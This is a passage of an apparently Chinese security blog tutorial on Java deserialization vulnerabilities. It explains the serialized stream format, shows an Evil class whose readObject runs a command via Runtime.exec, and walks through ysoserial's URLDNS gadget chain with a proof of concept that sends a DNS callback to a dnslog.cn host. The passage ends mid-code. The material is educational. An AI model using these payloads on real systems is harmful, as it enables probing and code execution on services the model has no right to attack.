class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000: aced 0005 7372 0012 5365 7269 616c 697a  ....sr..Serializ</span><br><span class="line">00000010: 6174 696f 6e2e 5573 6572 ade4 cb02 ab94  ation.User......</span><br><span class="line">00000020: b2b9 0200 014c 0004 6e61 6d65 7400 124c  .....L..namet..L</span><br><span class="line">00000030: 6a61 7661 2f6c 616e 672f 5374 7269 6e67  java&#x2F;lang&#x2F;String</span><br><span class="line">00000040: 3b78 7074 0009 4c65 6172 6e4a 6176 61    ;xpt..LearnJava</span><br></pre></td></tr></table></figure><blockquote><p>根据序列化规范，aced代表java序列化数据的magic wordSTREAM_MAGIC,0005表示版本号STREAM_VERSION,73表示是一个对象TC_OBJECT,72表示这个对象的描述TC_CLASSDESC</p></blockquote><h2 id="readObject-方法"><a href="#readObject-方法" class="headerlink" title="readObject()方法"></a>readObject()方法</h2><blockquote><p>从JAVA反序列化RCE的三要素（readobject反序列化利用点 + 利用链 + RCE触发点）来说，是通过（readobject反序列化利用点 + DNS查询）来确认readobject反序列化利用点的存在。</p></blockquote><p>实现了java.io.Serializable接口的类还可以定义如下方法(反序列化魔术方法)将会在类序列化和反序列化过程中调用：</p><ul><li>private void writeObject(ObjectOutputStream oos),自定义序列化</li><li>private void readObject(ObjectInputStream ois),自定义反序列化</li></ul><p>readObject()方法被重写的的话，反序列化该类时调用便是重写后的readObject()方法。如果该方法书写不当的话就有可能引发恶意代码的执行：</p><p>Evil.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> EvilSerializtion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> EvilSerializtion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Evil evil = <span class="keyword">new</span> Evil();</span><br><span class="line">        evil.cmd = <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] serializeData = serialize(evil);</span><br><span class="line">        unserialize(serializeData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream btout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream btin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210405200638.png"></p><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p><code>URLDNS</code> 是ysoserial中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞。该利用链具有如下特点：</p><ul><li>不限制jdk版本，使用Java内置类，对第三方依赖没有要求</li><li>目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞</li><li>URLDNS利用链，只能发起DNS请求，并不能进行其他利用</li></ul><p>ysoserial中列出的Gadget:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure><p>原理：</p><p><code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 hashCode 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求.</p><p>HashMap#readObject:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="comment">// 读取传入的输入流，对传入的序列化数据进行反序列化</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关注<code>putVal</code>方法，<code>putVal</code>是往HashMap中放入键值对的方法，这里调用了<code>hash</code>方法来处理key，跟进<code>hash</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里又调用了<code>key.hashcode</code>方法，而key此时是我们传入的 <code>java.net.URL</code> 对象，那么跟进到这个类的hashCode()方法看下</p><p>URL#hashCode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;  <span class="comment">// synchronized 关键字修饰的方法为同步方法。当synchronized方法执行完或发生异常时，会自动释放锁。</span></span><br><span class="line">      <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">          <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">      hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">return</span> hashCode;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>当hashCode字段等于-1时会进行<code>handler.hashCode(this)</code>计算，跟进handler发现，定义是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler; <span class="comment">// transient 关键字，修饰Java序列化对象时，不需要序列化的属性</span></span><br></pre></td></tr></table></figure><p>那么跟进<code>java.net.URLStreamHandler#hashCode()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the protocol part.</span></span><br><span class="line">       String protocol = u.getProtocol();</span><br><span class="line">       <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">           h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the host part.</span></span><br><span class="line">       InetAddress addr = getHostAddress(u);</span><br><span class="line">       <span class="keyword">if</span> (addr != <span class="keyword">null</span>) &#123;</span><br><span class="line">           h += addr.hashCode();</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           String host = u.getHost();</span><br><span class="line">           <span class="keyword">if</span> (host != <span class="keyword">null</span>)</span><br><span class="line">               h += host.toLowerCase().hashCode();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the file part.</span></span><br><span class="line">       String file = u.getFile();</span><br><span class="line">       <span class="keyword">if</span> (file != <span class="keyword">null</span>)</span><br><span class="line">           h += file.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the port part.</span></span><br><span class="line">       <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">           h += getDefaultPort();</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           h += u.getPort();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the ref part.</span></span><br><span class="line">       String ref = u.getRef();</span><br><span class="line">       <span class="keyword">if</span> (ref != <span class="keyword">null</span>)</span><br><span class="line">           h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> h;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>u 是我们传入的url，在调用<code>getHostAddress</code>方法时，会进行dns查询。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210408003342.png"></p><p>这是正面分析的流程。</p><p>回到开始的Hashmap#readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    K key = (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    V value = (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>key 是从<code>K key = (K) s.readObject();</code>    这段代码，也是就是readObject中得到的，说明之前在writeObject会写入key</p><p>Hashmap#writeObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> buckets = capacity();</span><br><span class="line">    <span class="comment">// Write out the threshold, loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line">    s.writeInt(buckets);</span><br><span class="line">    s.writeInt(size);</span><br><span class="line">    internalWriteEntries(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后调用了<code>internalWriteEntries</code> 方法，跟进一下具体实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Called only from writeObject, to ensure compatible ordering.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">internalWriteEntries</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab;</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; (tab = table) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tab.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Node&lt;K,V&gt; e = tab[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">                s.writeObject(e.key);</span><br><span class="line">                s.writeObject(e.value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的key以及value是从tab中取的，而tab的值即HashMap中table的值。</p><p>想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以在这里就会产生第一次dns查询：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了避免这一次的dns查询（防止本机与目标机器发送的dns请求混淆），ysoserial 中使用<code>SilentURLStreamHandler</code>    方法，直接返回null，并不会像<code>URLStreamHandler</code>那样去调用一系列方法最终到<code>getByName</code>，因此也就不会触发dns查询了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了这种方法还可以在本地生成payload时，将hashCode设置不为<code>-1</code>的其他值。</p><p>URL#hashCode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">          <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">      hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">return</span> hashCode;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果不为<code>-1</code>，那么直接返回了。也就不会进行<code>handler.hashCode(this);</code>这一步计算hashcode，也就没有之后的<code>getByName</code>，获取dns查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The URLStreamHandler for this URL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">transient</span> URLStreamHandler handler;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Our hash code.</span></span><br><span class="line"><span class="comment"> * @serial</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> hashCode = -<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>而hashCode是通过<code>private</code>关键字进行修饰的（本类中可使用），可以通过反射来修改hashCode的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://7gjq24.dnslog.cn&quot;</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>); <span class="comment">// 反射获取URL类中的hashCode</span></span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>); <span class="comment">// 绕过Java语言权限控制检查的权限</span></span><br><span class="line">        f.set(url,<span class="number">123</span>);</span><br><span class="line">        System.out.println(url.hashCode());</span><br><span class="line">        map.put(url,<span class="number">123</span>); <span class="comment">// 调用HashMap对象中的put方法，此时因为hashcode不为-1，不再触发dns查询</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完整的POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://7gjq24.dnslog.cn&quot;</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>); <span class="comment">// 绕过Java语言权限控制检查的权限</span></span><br><span class="line">        f.set(url,<span class="number">123</span>); <span class="comment">// 设置hashcode的值为-1的其他任何数字</span></span><br><span class="line">        System.out.println(url.hashCode());</span><br><span class="line">        map.put(url,<span class="number">123</span>); <span class="comment">// 调用HashMap对象中的put方法，此时因为hashcode不为-1，不再触发dns查询</span></span><br><span class="line">        f.set(url,-<span class="number">1</span>); <span class="comment">// 将hashcode重新设置为-1，确保在反序列化成功触发</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./urldns.ser&quot;</span>);</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line"></span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;./urldns.ser&quot;</span>);</span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span 